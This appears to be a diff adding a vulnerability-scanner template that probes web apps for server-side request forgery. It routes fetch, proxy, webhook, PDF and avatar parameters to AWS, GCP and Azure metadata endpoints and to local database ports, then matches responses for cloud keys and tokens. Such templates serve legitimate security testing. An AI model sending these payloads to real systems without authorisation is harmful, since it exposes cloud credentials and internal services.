@@ -1,0 +1,202 @@
+id: a10-ssrf
+
+info:
+  name: A10:2021 - Server-Side Request Forgery (SSRF)
+  author: legioncyber
+  severity: high
+  description: |
+    Tests for SSRF vulnerabilities via URL parameters that fetch remote content, image/file
+    import functionality, webhook URL parameters, and PDF generation with URL input.
+    Maps to OWASP Top 10 2021 A10.
+  tags: owasp,a10,ssrf
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10.0
+    cwe-id: CWE-918
+    owasp-id: A10-2021
+
+requests:
+  # -----------------------------------------------------------------------
+  # Cloud metadata — AWS IMDSv1
+  # -----------------------------------------------------------------------
+  - method: GET
+    path:
+      - "{{BaseURL}}/fetch?url=http://169.254.169.254/latest/meta-data/"
+      - "{{BaseURL}}/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+      - "{{BaseURL}}/image?src=http://169.254.169.254/latest/user-data"
+      - "{{BaseURL}}/load?resource=http://169.254.169.254/latest/meta-data/hostname"
+      - "{{BaseURL}}/api/fetch?target=http://169.254.169.254/"
+      - "{{BaseURL}}/download?url=http://169.254.169.254/"
+      - "{{BaseURL}}/screenshot?url=http://169.254.169.254/"
+      - "{{BaseURL}}/render?url=http://169.254.169.254/"
+    matchers-condition: or
+    matchers:
+      - type: regex
+        regex:
+          - "ami-[a-z0-9]+"
+          - "instance-id"
+          - "placement/region"
+          - "iam/security-credentials"
+          - "AccessKeyId"
+          - "SecretAccessKey"
+        part: body
+
+  # -----------------------------------------------------------------------
+  # Cloud metadata — GCP
+  # -----------------------------------------------------------------------
+  - method: GET
+    path:
+      - "{{BaseURL}}/fetch?url=http://metadata.google.internal/computeMetadata/v1/"
+      - "{{BaseURL}}/proxy?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"
+      - "{{BaseURL}}/image?src=http://metadata.google.internal/"
+    headers:
+      # GCP metadata requires this header; SSRF from server would provide it automatically
+      Metadata-Flavor: Google
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "project-id"
+          - "service-accounts"
+          - "token"
+          - "scopes"
+          - "google"
+        condition: or
+        part: body
+        case-insensitive: true
+
+  # -----------------------------------------------------------------------
+  # Cloud metadata — Azure IMDS
+  # -----------------------------------------------------------------------
+  - method: GET
+    path:
+      - "{{BaseURL}}/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+      - "{{BaseURL}}/proxy?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "subscriptionId"
+          - "resourceGroupName"
+          - "access_token"
+          - "clientId"
+        condition: or
+        part: body
+
+  # -----------------------------------------------------------------------
+  # Internal service probing via URL parameters
+  # -----------------------------------------------------------------------
+  - method: GET
+    path:
+      - "{{BaseURL}}/fetch?url=http://localhost/"
+      - "{{BaseURL}}/fetch?url=http://127.0.0.1/"
+      - "{{BaseURL}}/fetch?url=http://localhost:8080/"
+      - "{{BaseURL}}/fetch?url=http://localhost:8443/"
+      - "{{BaseURL}}/fetch?url=http://localhost:6379/"
+      - "{{BaseURL}}/fetch?url=http://localhost:27017/"
+      - "{{BaseURL}}/fetch?url=http://localhost:5432/"
+      - "{{BaseURL}}/proxy?url=http://internal-api/"
+    matchers-condition: or
+    matchers:
+      - type: regex
+        regex:
+          - "(?i)redis_version"
+          - "(?i)MongoDB"
+          - "(?i)PostgreSQL"
+          - "(?i)mysql"
+          - "(?i)127\\.0\\.0\\.1"
+          - "localhost"
+        part: body
+
+  # -----------------------------------------------------------------------
+  # Webhook URL parameters accepting arbitrary hosts
+  # -----------------------------------------------------------------------
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/webhook"
+      - "{{BaseURL}}/api/webhooks"
+      - "{{BaseURL}}/webhook"
+      - "{{BaseURL}}/api/notify"
+      - "{{BaseURL}}/api/callback"
+    headers:
+      Content-Type: application/json
+    # Use an IANA reserved address to test if the server makes outbound requests
+    body: |
+      {"url": "http://169.254.169.254/latest/meta-data/", "event": "test"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+      - type: word
+        words:
+          - "success"
+          - "registered"
+          - "webhook"
+          - "created"
+        condition: or
+        part: body
+        case-insensitive: true
+
+  # -----------------------------------------------------------------------
+  # PDF / screenshot generation with URL input
+  # -----------------------------------------------------------------------
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/pdf"
+      - "{{BaseURL}}/api/generate-pdf"
+      - "{{BaseURL}}/pdf/generate"
+      - "{{BaseURL}}/api/screenshot"
+      - "{{BaseURL}}/api/render"
+    headers:
+      Content-Type: application/json
+    body: |
+      {"url": "http://169.254.169.254/latest/meta-data/", "format": "pdf"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 202
+      - type: word
+        words:
+          - "job_id"
+          - "task_id"
+          - "pdf"
+          - "download"
+          - "generating"
+        condition: or
+        part: body
+        case-insensitive: true
+
+  # -----------------------------------------------------------------------
+  # File import / URL-based image fetch
+  # -----------------------------------------------------------------------
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/import"
+      - "{{BaseURL}}/api/upload-url"
+      - "{{BaseURL}}/api/avatar"
+      - "{{BaseURL}}/profile/avatar"
+      - "{{BaseURL}}/api/media/import"
+    headers:
+      Content-Type: application/json
+    body: |
+      {"image_url": "http://169.254.169.254/latest/meta-data/", "type": "avatar"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+      - type: word
+        words:
+          - "url"
+          - "uploaded"
+          - "success"
+          - "path"
+          - "file"
+        condition: or
+        part: body
+        case-insensitive: true
